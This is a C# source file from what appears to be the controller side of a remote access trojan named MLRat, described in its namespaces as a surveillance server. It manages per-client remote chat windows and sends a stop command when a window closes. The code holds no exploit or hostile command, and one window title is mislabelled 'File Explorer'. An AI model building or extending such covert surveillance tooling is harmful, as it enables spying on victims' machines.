using MLRat.Server;
using MLSurveillanceServer.Forms;
using MLSurveillanceSharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLSurveillanceServer.Handlers
{
    public static class RemoteChatHandler
    {
        static Dictionary<Guid, RemoteChatForm> formHandler = new Dictionary<Guid, RemoteChatForm>();
        
        public static void ContextCallback(IClient[] clients)
        {
            foreach (IClient c in clients)
                StartChat(c);
        }

        public static void ClientDisconnect(IClient client)
        {
            if (formHandler.ContainsKey(client.ID))
            {
                if (formHandler[client.ID] != null)
                {
                    formHandler[client.ID].Close();
                    formHandler[client.ID].Dispose();
                }
                formHandler.Remove(client.ID);
            }
        }

        public static void NewClient(IClient client)
        {
            if(!formHandler.ContainsKey(client.ID))
            {
                formHandler.Add(client.ID, null);
            }
        }

        public static void Handle(IClient client, object[] data)
        {
            RemoteChatCommand rcCommand = (RemoteChatCommand)data[1];
            if (rcCommand == RemoteChatCommand.Message)
                NewMessage(client, (string)data[2]);
        }

        public static void NewMessage(IClient client, string message)
        {
            if (formHandler.ContainsKey(client.ID))
            {
                if (formHandler[client.ID] != null)
                {
                    formHandler[client.ID].NewChat(message);
                }
            }
        }

        public static void StartChat(IClient client)
        {
            if (formHandler.ContainsKey(client.ID))
            {
                if(formHandler[client.ID] == null)
                {
                    formHandler[client.ID] = new RemoteChatForm(client);
                    formHandler[client.ID].FormClosed += RemoteChatHandler_FormClosed;
                    formHandler[client.ID].Text = string.Format("File Explorer ({0})", client.GetVariable<string>("Username", ""));
                    formHandler[client.ID].Show();
                }
            }
        }

        private static void RemoteChatHandler_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
        {
            RemoteChatForm formSender = (RemoteChatForm)sender;
            IClient client = formSender.client;
            formSender.Dispose();
            formHandler[client.ID] = null;
            client.Send((byte)NetworkCommand.RemoteChat, (byte)RemoteChatCommand.Stop);
        }
    }
}
